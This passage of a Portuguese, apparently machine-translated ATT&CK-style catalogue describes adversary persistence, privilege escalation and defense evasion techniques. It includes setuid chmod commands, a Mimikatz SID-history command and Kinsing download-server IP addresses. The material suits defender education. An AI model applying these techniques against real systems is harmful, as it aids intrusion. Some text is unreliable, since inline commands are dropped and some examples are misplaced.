.006 **Temporizadores Sistematos:** Os temporizadores sistematos são arquivos unitários com extensão de arquivo que controlam os serviços. Os temporizadores podem ser definidos para serem executados em um evento de calendário ou após um período de tempo em relação a um ponto de partida.

**Exemplo de procedimento:** Um adversário pode usar temporizadores sistematos para executar código malicioso na inicialização do sistema ou em uma base programada para persistência. Os temporizadores instalados usando caminhos privilegiados podem ser usados para manter a persistência do nível raiz. Os adversários também podem instalar temporizadores de nível de usuário para alcançar a persistência do nível do usuário.

.007 **Trabalho de orquestração de contêineres:** Os trabalhos de orquestração de contêineres executam essas tarefas automatizadas em uma data e hora específicas, semelhantes aos trabalhos de cron em um sistema Linux. Implantações desse tipo também podem ser configuradas para manter uma quantidade de contêineres ao longo do tempo, automatizando o processo de manutenção da persistência dentro de um cluster.

**Exemplo de procedimento:** Em Kubernetes, um CronJob pode ser usado para agendar um Trabalho que executa um ou mais contêineres para executar tarefas específicas.[1][2] Um adversário, portanto, pode utilizar um CronJob para agendar a implantação de um Trabalho que executa código malicioso em vários nós dentro de um cluster.

T1505 **Componente de software do servidor:** Os adversários podem abusar de recursos legítimos de desenvolvimento extensível de servidores para estabelecer acesso persistente a sistemas. Os aplicativos de servidor corporativo podem incluir recursos que permitem aos desenvolvedores escrever e instalar softwares ou scripts para ampliar a funcionalidade do aplicativo principal. Os adversários podem instalar componentes maliciosos para estender e abusar de aplicativos de servidores.

.001 **Procedimentos armazenados no SQL:**  Sql Stored Procedures são códigos que podem ser salvos e reutilizados para que os usuários do banco de dados não percam tempo reescrevendo consultas SQL usadas com frequência. Os procedimentos armazenados podem ser invocados através de instruções SQL para o banco de dados usando o nome do procedimento ou através de eventos definidos (por exemplo, quando um aplicativo de servidor SQL é iniciado/reiniciado).

**Exemplo de procedimentos:** Os adversários podem criar procedimentos armazenados maliciosos que podem fornecer um mecanismo de persistência em servidores de banco de dados SQL. Para executar comandos do sistema operacional através da sintaxe SQL, o adversário pode ter que habilitar funcionalidades adicionais, como xp_cmdshell para o SERVIDOR MSSQL.

**REFERÊNCIA:** https://www.dragos.com/wp-content/uploads/CRASHOVERRIDE2018.pdf

.002 **Agente de Transporte:** Os agentes de transporte do Microsoft Exchange podem operar em mensagens de e-mail que passam pelo pipeline de transporte para executar várias tarefas, como filtrar spam, filtrar anexos maliciosos, diários ou adicionar uma assinatura corporativa ao final de todos os e-mails de saída. Os agentes de transporte podem ser escritos por desenvolvedores de aplicativos e, em seguida, compilados para montagens .NET que são posteriormente registrados no servidor Exchange.

**Exemplo de procedimento:** Os adversários podem registrar um agente de transporte malicioso para fornecer um mecanismo de persistência no Exchange Server que pode ser acionado por eventos de e-mail especificados pelo adversário. Embora um agente de transporte malicioso possa ser invocado para todos os e-mails que passam pelo pipeline de transporte exchange, o agente pode ser configurado apenas para realizar tarefas específicas em resposta a critérios definidos pelo adversário.

**REFERÊNCIA:** https://www.welivesecurity.com/wp-content/uploads/2019/05/ESET-LightNeuron.pdf 

.003 **Web Shell:** Um shell web é um script da Web que é colocado em um servidor web abertamente acessível para permitir que um adversário use o servidor da Web como um gateway em uma rede. Um shell web pode fornecer um conjunto de funções para executar ou uma interface de linha de comando no sistema que hospeda o servidor Web.Além de um script do lado do servidor, um web shell pode ter um programa de interface de cliente que é usado para falar com o servidor web (ex: China Chopper Web shell cliente)

**REFERÊNCIA:** https://www.ncsc.gov.uk/files/Advisory-further-TTPs-associated-with-SVR-cyber-actors.pdf

.004 **Componentes IIS:** O IIS fornece vários mecanismos para ampliar a funcionalidade dos servidores web. Por exemplo, extensões e filtros isapi (Internet Server Application Programming Interface, interface de programação de aplicativos do servidor da Internet) podem ser instalados para examinar e/ou modificar solicitações web IIS recebidas e de saída. Extensões e filtros são implantados como arquivos DLL que exportam três funções: , e (opcionalmente) . Os módulos IIS também podem ser instalados para estender servidores web IIS.

**Exemplo de procedimento:** Os adversários também podem instalar módulos IIS maliciosos para observar e/ou modificar o tráfego. O IIS 7.0 introduziu módulos que fornecem o mesmo acesso irrestrito às solicitações e respostas HTTP que as extensões e filtros ISAPI. Os módulos IIS podem ser escritos como um DLL que exporta , ou como um aplicativo .NET que faz interface com ASP.NET APIs para acessar solicitações IIS HTTP.

**REFERÊNCIA:** https://www.secureworks.com/research/threat-group-3390-targets-organizations-for-cyberespionage

T1205 **Sinalização de tráfego:**A sinalização de tráfego envolve o uso de um valor ou sequência mágica que deve ser enviado a um sistema para acionar uma resposta especial, como abrir uma porta fechada ou executar uma tarefa maliciosa. Isso pode assumir a forma de enviar uma série de pacotes com certas características antes que uma porta seja aberta que o adversário possa usar para comando e controle

.001 **Port Knocking:** Para habilitar uma porta, um adversário envia uma série de tentativas de conexões para uma sequência predefinida de portas fechadas. Depois que a sequência é concluída, a abertura de uma porta é frequentemente realizada pelo firewall baseado no host, mas também pode ser implementada por software personalizado.

**Exemplo de procedimento:** O PROMETHIUM usou um script que configura o serviço e o firewall para aceitar apenas conexões C2 de sistemas que usam uma sequência especificada de portas knock: 

**REFERÊNCIA:** https://www.bitdefender.com/files/News/CaseStudies/study/353/Bitdefender-Whitepaper-StrongPity-APT.pdf

T1078 **Contas válidas:** Credenciais comprometidas podem ser usadas para contornar controles de acesso colocados em vários recursos em sistemas dentro da rede e podem até ser usados para acesso persistente a sistemas remotos e serviços disponíveis externamente, como VPNs, Outlook Web Access e desktop remoto. As credenciais comprometidas também podem conceder a um adversário maior privilégio a sistemas específicos ou acesso a áreas restritas da rede.

.001 **Contas padrão:** As contas padrão são aquelas que são incorporadas a um SO, como as contas do Convidado ou administrador em sistemas Windows. As contas padrão também incluem contas padrão de fábrica/provedor em outros tipos de sistemas, software ou dispositivos, incluindo a conta de usuário raiz no AWS e a conta de serviço padrão em Kubernetes.

.002 **Contas de domínio:** As contas de domínio são aquelas gerenciadas pelos Serviços de Domínio do Active Directory, onde o acesso e as permissões são configurados entre sistemas e serviços que fazem parte desse domínio. As contas de domínio podem cobrir usuários, administradores e serviços.

**Exemplo de procedimento:** Os adversários podem comprometer contas de domínio, algumas com alto nível de privilégios, através de vários meios, como o Dumping de Credenciais do OS ou o reaproveitamento de senhas, permitindo o acesso a recursos privilegiados do domínio.

**REFERÊNCIA:** https://research.nccgroup.com/2021/01/12/abusing-cloud-services-to-fly-under-the-radar/

.002 **Contas locais:** As contas locais são aquelas configuradas por uma organização para uso por usuários, suporte remoto, serviços ou para administração em um único sistema ou serviço.

**Exemplo de procedimento:** Contas locais também podem ser abusadas para elevar privilégios e colher credenciais através do Dumping de Credenciais do OS. O reaproveitamento de senhas pode permitir o abuso de contas locais em um conjunto de máquinas em uma rede para fins de Escalada de Privilégios e Movimento Lateral.

**REFERÊNCIA:** https://www.mandiant.com/resources/cyber-espionage-apt32

.003 **Contas em nuvem:** Contas em nuvem são aquelas criadas e configuradas por uma organização para uso por usuários, suporte remoto, serviços ou para administração de recursos dentro de um provedor de serviços em nuvem ou aplicativo SaaS. 

**Exemplo de procedimento:** Credenciais comprometidas para contas em nuvem podem ser usadas para coletar dados confidenciais de contas de armazenamento on-line e bancos de dados. O acesso a contas em nuvem também pode ser abusado para obter acesso inicial a uma rede abusando de um Relacionamento Confiável. Semelhante às Contas de Domínio, o comprometimento das contas em nuvem federadas pode permitir que os adversários se movam mais facilmente lateralmente dentro de um ambiente.

**REFERÊNCIA:** https://www.microsoft.com/security/blog/2020/06/18/inside-microsoft-threat-protection-mapping-attack-chains-from-cloud-to-endpoint/

TA0005 **EVASÃO DE DEFESA :** 

A Evasão de Defesa consiste em técnicas que os adversários usam para evitar a detecção durante todo o seu compromisso. As técnicas utilizadas para evasão de defesa incluem desinstalar/desativar softwares de segurança ou ofuscar/criptografar dados e scripts. 

T1548 **Mecanismo de controle de elevação de abuso:** A maioria dos sistemas modernos contém mecanismos nativos de controle de elevação que visam limitar privilégios que um usuário pode executar em uma máquina. A autorização deve ser concedida a usuários específicos para realizar tarefas que possam ser consideradas de maior risco. Um adversário pode executar vários métodos para aproveitar mecanismos de controle incorporados, a fim de escalar privilégios em um sistema.

.001 **Setuida e Setgid:** o Linux ou macOS, quando os bits setuidas ou setgid forem definidos para um aplicativo, o aplicativo será executado com os privilégios do usuário ou grupo próprio, respectivamente. Normalmente, um aplicativo é executado no contexto atual do usuário, independentemente de qual usuário ou grupo possua o aplicativo. 

**Exemplo de procedimento:** Em vez de criar uma entrada no arquivo sudoers, que deve ser feita por raiz, qualquer usuário pode especificar o setuid ou o sinalizador setgid a ser definido para seus próprios aplicativos. Esses bits são indicados com um "s" em vez de um "x" ao visualizar os atributos de um arquivo via . O programa pode definir esses bits com via bitmasking, ou através de nomeação taquigrafia, .ls -lchmodchmod 4777 [file]chmod u+s [file]

Os adversários podem usar esse mecanismo em seu próprio malware para garantir que eles sejam capazes de executar em contextos elevados no futuro.

**REFERÊNCIA:** https://www.welivesecurity.com/2016/07/06/new-osxkeydnap-malware-hungry-credentials/

.002 **Ignorar o controle da conta do usuário:** O UAC (User Account Control, controle de contas de usuário do Windows) permite que um programa eleve seus privilégios (rastreados como níveis de integridade que variam de baixo a alto) para executar uma tarefa sob permissões de nível de administrador, possivelmente solicitando ao usuário a confirmação. 

**REFERÊNCIA:** https://medium.com/d-hunter/a-look-into-konni-2019-campaign-b45a0f321e9b

.003 **Sudo e Sudo Caching:** Os adversários podem realizar o suodering e/ou usar o arquivo suoders para elevar privilégios. Os adversários podem fazer isso para executar comandos como outros usuários ou gerar processos com privilégios maiores.

**Exemplo de procedimento:** Os adversários também podem abusar de configurações ruins desses mecanismos para escalar privilégios sem precisar da senha do usuário. Por exemplo, o estamp de tempo pode ser monitorado para ver se ele se encaixa dentro do intervalo. Se isso acontecer, então o malware pode executar comandos sudo sem precisar fornecer a senha do usuário. Adicional, se estiver desativado, os adversários podem fazer isso de qualquer tty para esse usuário.

**REFERÊNCIA:** https://web.archive.org/web/20210708035426/https://www.cobaltstrike.com/downloads/csmanual43.pdf

.004 **Execução elevada com prompt:**  O objetivo desta API é dar aos desenvolvedores de aplicativos uma maneira fácil de executar operações com privilégios raiz, como para instalação ou atualização de aplicativos. Esta API não valida que o programa que solicita privilégios raiz vem de uma fonte respeitável ou foi maliciosamente modificado. 

**Exemplo de procedimento:** Os adversários podem abusar para obter privilégios radiculares, a fim de instalar softwares maliciosos nas vítimas e instalar mecanismos de persistência. Essa técnica pode ser combinada com o Masquerading para enganar o usuário para conceder privilégios escalonados a códigos maliciosos. Esta técnica também tem sido demonstrada para funcionar modificando programas legítimos presentes na máquina que fazem uso desta API.

**REFERÊNCIA: https://speakerdeck.com/patrickwardle/defcon-2017-death-by-1000-installers-its-all-broken?slide=8

T1134 **Manipulação de token de acesso:** O Windows usa tokens de acesso para determinar a propriedade de um processo em execução. Um usuário pode manipular tokens de acesso para fazer um processo de execução parecer que é filho de um processo diferente ou pertence a alguém que não seja o usuário que iniciou o processo. Quando isso ocorre, o processo também assume o contexto de segurança associado ao novo token. 

**Exemplo de procedimento:** Um adversário pode usar funções de API do Windows incorporadas para copiar tokens de acesso de processos existentes; isso é conhecido como roubo de token. Esses tokens podem então ser aplicados a um processo existente (ou seja, Imitação/Roubo de Token) ou usados para gerar um novo processo (ou seja, criar processo com token). Um adversário já deve estar em um contexto de usuário privilegiado (ou seja, administrador) para roubar um token.

**REFERÊNCIA:** https://blog.malwarebytes.com/threat-intelligence/2021/06/kimsuky-apt-continues-to-target-south-korean-government-using-appleseed-backdoor/

.001 **Imitação/Roubo de Token:** Um adversário pode criar um novo token de acesso que duplica um token existente usando . O token pode então ser usado para permitir que o segmento de chamada se passe por um conectado no contexto de segurança do usuário ou com a atribuição do token personificado a um segmento. Um adversário pode fazer isso quando tiver um processo específico e existente para o seu lado. Por exemplo, isso pode ser útil para quando o usuário-alvo tiver uma sessão de logon não-rede no sistema.

**REFERÊNCIA:** https://research.checkpoint.com/2020/naikon-apt-cyber-espionage-reloaded/ 

.002 **Criar processo com token:** Os processos podem ser criados com o token e o contexto de segurança resultante de outro usuário usando recursos como e .CreateProcessWithTokenWrunas. A criação de processos com um token diferente pode exigir as credenciais do usuário-alvo, privilégios específicos para se passar por esse usuário ou acesso ao token a ser usado (ex: reunidos através de outros meios, como Token Personificação/Roubo ou Make and Personificar Token).

**REFERÊNCIA:** https://www.mcafee.com/blogs/other-blogs/mcafee-labs/hidden-cobra-targets-turkish-financial-sector-new-bankshot-implant/

.003 **Fazer e Personificar Token:** Os adversários podem fazer e se passar por tokens para escalar privilégios e ignorar controles de acesso. Se um adversário tiver um nome de usuário e senha, mas o usuário não estiver conectado ao sistema, o adversário poderá criar uma sessão de logon para o usuário usando a função. A função retornará uma cópia do token de acesso da nova sessão e o adversário poderá usar para atribuir o token a um segmento.

**REFERÊNCIA:** https://docs.microsoft.com/pt-br/windows/security/threat-protection/security-policy-settings/create-a-token-object

.004 **Spoofing de PID:** Novos processos são normalmente gerados diretamente de seus pais, ou chamando, processo, a menos que explicitamente especificado. Uma forma de atribuir explicitamente o PPID de um novo processo é através da chamada API, que suporta um parâmetro que define o PPID para uso

**Exemplo de procedimento:** Os adversários podem abusar desses mecanismos para evitar defesas, como aqueles processos de bloqueio que desovam diretamente de documentos do Office, e análises direcionadas a relações incomuns/potencialmente maliciosas de processo entre pais e filhos, como a falsificação do PPID do PowerShell/Rundll32 para ser, em vez de um documento do Office entregue como parte do Spearphishing Attachment.Essa falsificação pode ser executada via Visual Basic dentro de um documento do Office malicioso ou qualquer código que possa executar API nativa

.005 **Injeção sid-history:**  O identificador de segurança do Windows (SID) é um valor único que identifica uma conta de usuário ou grupo. Os SIDs são usados pela segurança do Windows tanto em descritores de segurança quanto em tokens de acesso.

**Exemplo de procedimento:** Mimikatz pode anexar qualquer conta SID ou usuário/grupo ao HISTÓRICO SID de um usuário. Mimikatz também utiliza a SID-History Injection para expandir o escopo de outros componentes, como o Kerberos Golden Tickets gerado e o DCSync além de um único domínio.MISC::AddSid 

T1197 **Empregos bits:** O Bits (Windows Background Intelligent Transfer Service, serviço de transferência inteligente de fundo do Windows) é um mecanismo de transferência de arquivos assíncrona de baixa largura de banda exposto através do Com (Component Object Model, modelo de objeto componente) O BITS é comumente usado por atualizadores, mensageiros e outros aplicativos preferidos para operar em segundo plano (usando largura de banda ociosa disponível) sem interromper outros aplicativos em rede.

**Exemplo de procedimento:** Os adversários podem abusar do BITS para baixar, executar e até mesmo limpar depois de executar código malicioso. As tarefas do BITS são independentes no banco de dados de trabalho bits, sem novos arquivos ou modificações de registro, e muitas vezes permitidas por firewalls host.

**REFERÊNCIA:** https://adsecurity.org/?page_id=1821

T1612 **Construir imagem no host:** Os adversários podem construir uma imagem de contêiner diretamente em um host para contornar defesas que monitoram a recuperação de imagens maliciosas de um registro público. Uma solicitação remota pode ser enviada para a API Docker que inclui um Dockerfile que puxa uma imagem base de baunilha, como alpino, de um registro público ou local e, em seguida, constrói uma imagem personalizada sobre ele

**Exemplo de procedimento:** Um adversário pode aproveitar essa API para construir uma imagem personalizada no host que inclui malware baixado de seu servidor C2 e, em seguida, eles podem utilizar o Deploy Container usando essa imagem personalizada. Se a imagem base for retirada de um registro público, as defesas provavelmente não detectarão a imagem como maliciosa, já que é uma imagem de baunilha.

T1140 **Desobsculindo/decodificar arquivos ou informações:** Os adversários podem usar Arquivos ou Informações Ofuscadas para ocultar artefatos de uma intrusão da análise. Eles podem exigir mecanismos separados para decodificar ou desobscodificar essas informações, dependendo de como pretendem usá-la. Os métodos para fazer isso incluem a funcionalidade incorporada do malware ou usando utilitários presentes no sistema.

T1610 **Implantar Contêiner:** Em alguns casos, os adversários podem implantar um novo contêiner para executar processos associados a uma determinada imagem ou implantação, como processos que executam ou baixam malware. Em outros, um adversário pode implantar um novo contêiner configurado sem regras de rede, limitações de usuários, etc. para contornar as defesas existentes dentro do ambiente. 

**Exemplo de procedimento:** Os contêineres podem ser implantados por vários meios, como através de Docker's e APIs ou através de um aplicativo web, como o painel Kubernetes ou Kubeflow. Os adversários podem implantar contêineres com base em imagens maliciosas recuperadas ou construídas ou a partir de imagens benignas que baixam e executam cargas maliciosas no tempo de execução

**REFERÊNCIA:** https://blog.aquasec.com/malicious-container-image-docker-container-host

T1006 **Acesso direto ao volume:** Os atacantes podem acessar diretamente um volume para contornar controles de acesso a arquivos e monitoramento do sistema. O Windows permite que os programas tenham acesso direto a volumes lógicos. Programas com acesso direto podem ler e gravar arquivos diretamente da unidade analisando estruturas de dados do sistema de arquivos

**REFERÊNCIA:** https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1

T1484 **Modificação da politica de domínio:** s domínios fornecem um meio centralizado de gerenciar como os recursos de computador (ex: computadores, contas de usuário) podem agir e interagir uns com os outros, em uma rede. A política do domínio também inclui configurações que podem ser aplicadas entre domínios em um ambiente multi-domínio/floresta. 

**Exemplo de procedimento:** Com permissões suficientes, os adversários podem modificar as configurações da política de domínio. Uma vez que as configurações de configuração de domínio controlam muitas das interações dentro do ambiente Active Directory (AD), há um grande número de ataques potenciais que podem decorrer desse abuso. Exemplos de tais abusos incluem modificar GPOs para empurrar uma tarefa agendada maliciosa para computadores em todo o ambiente de domínio 

**REFERÊNCIA:** https://adsecurity.org/?p=2716

.001 ** Modificação da política de grupo:**  A política de grupo permite um gerenciamento centralizado das configurações de usuário e computador no Active Directory (AD). GPOs são contêineres para configurações de políticas de grupo compostas de arquivos armazenados dentro de um caminho de rede predileto 

**Exemplo de procedimento:** scripts disponíveis publicamente, como podem ser aproveitados para automatizar a criação de uma tarefa/trabalho agendada maliciosa modificando as configurações do GPO, neste caso modificando. Em alguns casos, um adversário pode modificar direitos específicos do usuário, como o SeEnableDelegationPrivilege, definido , para obter um backdoor AD sutil com controle completo do domínio porque a conta do usuário sob o controle do adversário seria então capaz de modificar GPOs.

**REFERÊNCIA:** https://www.cybereason.com/blog/cybereason-vs-egregor-ransomware

.002 **Modificação da confiança do domínio:**  Detalhes de confiança de domínio, como se um domínio é ou não federado, permitem que propriedades de autenticação e autorização se apliquem entre domínios com a finalidade de acessar recursos compartilhados

**Exemplo de procedimento:** Manipular os trusts de domínio pode permitir que um adversário aumente privilégios e/ou evite defesas modificando configurações para adicionar objetos que eles controlam. Por exemplo, isso pode ser usado para forjar tokens SAML, sem a necessidade de comprometer o certificado de assinatura para forjar novas credenciais. Em vez disso, um adversário pode manipular os trusts de domínio para adicionar seu próprio certificado de assinatura.

**REFERÊNCIA:** https://docs.microsoft.com/en-us/azure/active-directory/hybrid/whatis-fed

T1480 **Guardrails de execução:** Guardrails garantem que uma carga só é executada contra um alvo pretendido e reduz danos colaterais da campanha de um adversário. Valores que um adversário pode fornecer sobre um sistema de destino ou ambiente para usar como guardrails podem incluir nomes específicos de compartilhamento de rede, dispositivos físicos anexados, arquivos, domínios do Active Directory (AD) e endereços IP locais/externos.

**REFERÊNCIA:** https://www.cybereason.com/blog/dropping-anchor-from-a-trickbot-infection-to-the-discovery-of-the-anchor-malware 

.001 ** Chave ambiental:** O chaveamento ambiental usa criptografia para restringir a execução ou ações baseadas em condições específicas do ambiente fornecidas pelo adversário que devem estar presentes no alvo. O keying ambiental é uma implementação de Guardrails de execução que utiliza técnicas criptográficas para derivar chaves de criptografia/descriptografia de tipos específicos de valores em um determinado ambiente de computação.

**Exemplo de procedimento:** o adversário pode evitar empacotar a chave de descriptografia com a carga ou enviá-la por uma conexão de rede potencialmente monitorada. Dependendo da técnica para a coleta de valores específicos de destino, a engenharia reversa da carga criptografada pode ser excepcionalmente difícil.

**REFERÊNCIA:** https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/20134940/kaspersky-lab-gauss.pdf

T1211 **Exploração para evasão de defesa:** A exploração de uma vulnerabilidade de software ocorre quando um adversário se aproveita de um erro de programação em um programa, serviço ou dentro do próprio software do sistema operacional ou do próprio kernel para executar código controlado por adversários

**Exemplo de procedimento:** Os adversários podem ter conhecimento prévio através do reconhecimento de que o software de segurança existe dentro de um ambiente ou podem realizar verificações durante ou logo após o sistema ser comprometido pela Descoberta de Software de Segurança.

T1222 **Modificação de permissões de arquivo e diretório:** As permissões de arquivos e diretórios são comumente gerenciadas por ACLs configuradas pelo proprietário do arquivo ou diretório, ou usuários com as permissões apropriadas. As implementações de ACL de arquivos e diretórios variam de acordo com a plataforma, mas geralmente designam explicitamente quais usuários ou grupos podem executar quais ações (ler, escrever, executar, etc.).

**Exemplo de procedimento:**  implantando software Cryptominer como um adversário comum de crimeware: O malware é entregue como um aplicativo disfarçado como um doc do MS Office Word. o malware implanta um novo truque para evitar que o MS Office tente lançar o aplicativo disfarçado como um doc incorporando um caractere unicode no nome do arquivo. Isso faz com que os serviços de lançamento chamem de "aberto" no arquivo, em vez do programa padrão para ".doc".

**REFERÊNCIA:** https://www.sentinelone.com/labs/apt32-multi-stage-macos-trojan-innovates-on-crimeware-scripting-technique/

.001 **Modificação das permissões de arquivos e diretórios do Windows:** As permissões de arquivos e diretórios são comumente gerenciadas por ACLs configuradas pelo proprietário do arquivo ou diretório, ou usuários com as permissões apropriadas.

**Exemplo de procedimento:** Os adversários podem interagir com os DACLs usando comandos integrados do Windows, como , , , e , que podem conceder aos adversários permissões mais altas em arquivos e pastas específicas. Além disso, o PowerShell fornece cmdlets que podem ser usados para recuperar ou modificar daCLs de arquivos e diretórios.

**REFERÊNCIA:** https://www.crowdstrike.com/blog/big-game-hunting-the-evolution-of-indrik-spider-from-dridex-wire-fraud-to-bitpaymer-targeted-ransomware/

.002 **Modificação de permissões de arquivos e diretórios do Linux e Mac:** Os adversários podem modificar permissões/atributos de arquivo ou diretório para escapar das listas de controle de acesso (ACLs) e acessar arquivos protegidos.

**Exemplo de procedimento:** O Kinsing usou chmod para modificar permissões em arquivos-chave para uso : Aproveitando a porta de API aberta desprotegida, os atacantes são capazes de instanciar um contêiner Ubuntu com o seguinte ponto de entrada:
![image](https://user-images.githubusercontent.com/95362045/156773276-953e991e-4e66-4487-98fe-17b89c23a3b0.png)

Esse ponto de entrada em todos os ataques desta campanha, com a única mudança sendo o endereço IP do qual d.sh é baixado. Testemunhamos 3 endereços IP usados no total — o do exemplo acima, 217.12.221.244 e 185.92.74.42

**REFERÊNCIA:** https://blog.aquasec.com/threat-alert-kinsing-malware-container-vulnerability

T1564 **Ocultar artefatos:**  Os sistemas operacionais podem ter recursos para ocultar vários artefatos, como arquivos importantes do sistema e execução de tarefas administrativas, para evitar interromper os ambientes de trabalho do usuário e impedir que os usuários alterem arquivos ou recursos no sistema.

**Exemplo de procedimento:** Os adversários podem abusar desses recursos para ocultar artefatos, como arquivos, diretórios, contas de usuário ou outras atividades do sistema para evitar a detecção. Os adversários também podem tentar ocultar artefatos associados ao comportamento malicioso, criando regiões de computação isoladas da instrumentação de segurança comum, como através do uso da tecnologia de virtualização

**REFERÊNCIA:** https://news.sophos.com/en-us/2020/05/21/ragnar-locker-ransomware-deploys-virtual-machine-to-dodge-security/

.001 **Arquivos e Diretórios Ocultos:**  Para evitar que usuários normais alterem acidentalmente arquivos especiais em um sistema, a maioria dos sistemas operacionais tem o conceito de um arquivo 'oculto'. Esses arquivos não aparecem quando um usuário navega pelo sistema de arquivos com uma GUI ou ao usar comandos normais na linha de comando.

**Exemplo de procedimento:** Os adversários podem usar isso a seu favor para ocultar arquivos e pastas em qualquer lugar do sistema e evitar uma análise típica de usuário ou sistema que não incorpore a investigação de arquivos ocultos.

O principal começa com a entrega do agente tesla é o email de phishing, também é usado documentos maliciosos do Office.

**REFERÊNCIA:** https://www.sentinelone.com/labs/agent-tesla-old-rat-uses-new-tricks-to-stay-on-top/

.002 **Usuários ocultos:** Usuários normais podem querer ocultar usuários quando há muitas contas de usuários em um determinado sistema ou querer manter uma conta escondida dos outros usuários no sistema.

**Exemplo de procedimentos:** No Windows, os adversários podem ocultar contas de usuário através de configurações no Registro. Por exemplo, um adversário pode adicionar um valor ao Registro do Windows (via Reg ou outros meios) que ocultará o "teste" do usuário da tela de login do Windows:

**REFERÊNCIA:** https://www.mandiant.com/resources/darkside-affiliate-supply-chain-software-compromise

.003 **Janela oculta:** Em alguns casos, janelas que normalmente seriam exibidas quando um aplicativo realiza uma operação podem ser ocultas. Isso pode ser utilizado pelos administradores do sistema para evitar interromper os ambientes de trabalho do usuário ao realizar tarefas administrativas.

**Exemplo de procedimento:** Os adversários podem abusar dessas funcionalidades para ocultar janelas visíveis dos usuários para não alertar o usuário para a atividade adversária no sistema

**REFERÊNCIA:** https://blog.malwarebytes.com/threat-analysis/2017/01/new-mac-backdoor-using-antiquated-code/

.004 **Atributos de arquivo NTFS:** Os adversários podem usar atributos de arquivo NTFS para ocultar seus dados maliciosos, a fim de evitar a detecção. Cada partição formatada de New Technology File System (NTFS) contém uma Tabela de Arquivos Mestre (MFT) que mantém um registro para cada arquivo/diretório na partição.

**Exemplo de procedimento:** Os adversários podem armazenar dados maliciosos ou binários em metadados de atributos de arquivo em vez de diretamente em arquivos. Isso pode ser feito para evitar algumas defesas, como ferramentas de varredura de indicadores estáticos e antivírus. 

**REFERÊNCIA: http://journeyintoir.blogspot.com/2012/12/extracting-zeroaccess-from-ntfs.html

.005 **Sistema de arquivos oculto:** Os sistemas de arquivos fornecem uma estrutura para armazenar e acessar dados a partir de armazenamento físico. Normalmente, um usuário se envolve com um sistema de arquivos através de aplicativos que permitem acessar arquivos e diretórios, que são uma abstração de sua localização física (ex: setor de disco)

**Exemplo de procedimento:** Os adversários podem usar seu próprio sistema de arquivos abstrato, separado do sistema de arquivos padrão presente no sistema infectado. Ao fazer isso, os adversários podem ocultar a presença de componentes maliciosos e a entrada/saída de arquivos a partir de ferramentas de segurança.

**REFERÊNCIA:** https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/08064459/Equation_group_questions_and_answers.pdf

.006 **Executar instância virtual:** Existem uma grande variedade de tecnologias de virtualização que permitem a emulação de um computador ou ambiente de computação

**Exemplo de procedimento:** Ao executar códigos maliciosos dentro de uma instância virtual, os adversários podem ocultar artefatos associados ao seu comportamento a partir de ferramentas de segurança que não conseguem monitorar a atividade dentro da instância virtual. Os adversários podem utilizar suporte nativo para virtualização (ex: Hyper-V) ou soltar os arquivos necessários para executar uma instância virtual (ex: binários virtualbox). 

**REFERÊNCIA:** https://news.sophos.com/en-us/2020/05/21/ragnar-locker-ransomware-deploys-virtual-machine-to-dodge-security/

.007 ** VBA Stomping:** Os adversários podem ocultar cargas de base visual maliciosas para aplicativos (VBA) incorporadas nos documentos do MS Office, substituindo o código-fonte VBA por dados benignos.

**Exemplo de procedimento:** Um adversário pode ocultar código VBA malicioso ao substituir o local de código-fonte VBA com códigos benignos, ou bytes aleatórios, deixando o código p malicioso previamente compilado. Ferramentas que verificam código-fonte VBA mal-intencionado podem ser ignoradas à medida que o código indesejado está oculto no código p compilado.

**REFERÊNCIA:** https://medium.com/walmartglobaltech/vba-stomping-advanced-maldoc-techniques-612c484ab278

.008 **Regras de ocultação de e-mails:**  Muitos clientes de e-mail permitem que os usuários criem regras de caixa de entrada para várias funções de e-mail, incluindo a mudança de e-mails para outras pastas, marcação de e-mails como leitura ou exclusão de e-mails. 

**Exemplo de procedimento:** Os adversários podem utilizar regras de e-mail dentro da caixa de correio de um usuário comprometida para excluir e/ou mover e-mails para pastas menos perceptíveis. Os adversários podem fazer isso para ocultar alertas de segurança, comunicação C2 ou respostas aos e-mails internos de spearphishing enviados da conta comprometida.

**REFERÊNCIA:** https://www.fireeye.com/current-threats/threat-intelligence-reports/rpt-fin4.html

.009 **Forking de recursos:** Os adversários podem abusar de garfos de recursos para ocultar códigos maliciosos ou executáveis para evitar aplicativos de detecção e ignorar aplicativos de segurança.

**Exemplo de procedimento:** Os adversários podem usar garfos de recursos para ocultar dados maliciosos que podem ser armazenados diretamente em arquivos. Os adversários podem executar conteúdo com um garfo de recurso anexado, em um deslocamento especificado, que é movido para um local executável e então invocado. O conteúdo do garfo de recursos também pode ser ofuscado/criptografado até a execução.

**REFERÊNCIA:** https://www.sentinelone.com/labs/resourceful-macos-malware-hides-in-named-fork/

T1574 **Fluxo de execução de sequestro:**  O fluxo de execução de sequestros pode ser para fins de persistência, uma vez que esta execução sequestrada pode ocorrer recorrentemente ao longo do tempo. Os adversários também podem usar esses mecanismos para elevar privilégios ou evitar defesas, como controle de aplicativos ou outras restrições à execução.

**Exemplo de procedimento:** Um Malware chamado BackSwap se esconde em réplicas legítimas de programas como OllyDbg, 7-zip e FileZila, seu código malicioso implanta na inicialização do programa em um estágio inicial da execução substituindo o fluxo normal por instruções maliciosas 

**REFERÊNCIA:** https://www.cyberbit.com/blog/endpoint-security/dtrack-apt-malware-found-in-nuclear-power-plant/

.001 **Sequestro de ordem de busca DLL** Os sistemas Windows usam um método comum para procurar DLLs necessários para carregar em um programa.O sequestro de cargas DLL pode ser com o propósito de estabelecer persistência, bem como elevar privilégios e/ou evitar restrições na execução de arquivos.

**Exemplo de procedimento:** Os adversários também podem modificar diretamente a ordem de pesquisa via redirecionamento DLL, que após ser habilitado (no Registro e na criação de um arquivo de redirecionamento) pode fazer com que um programa carregue um DLL diferente.  O malware Guildma O principal é usado com o envio de arquivos maliciosos em formato compactado, anexados ao e-mail. Os tipos de arquivos variam de VBS a LNK; a campanha mais recente começou a anexar um arquivo HTML que executa Javascript para baixar um arquivo malicioso.

**REFERÊNCIA:** https://securelist.com/the-tetrade-brazilian-banking-malware/97779/

.003 **Carregamento lateral DLL:** O carregamento lateral aproveita o pedido de pesquisa DLL usado pelo carregador, posicionando o aplicativo da vítima e a carga de cargas maliciosas um ao lado do outro. Os adversários provavelmente usam o side-loading como um meio de mascarar ações que realizam sob um processo de sistema ou software legítimo, confiável e potencialmente elevado.

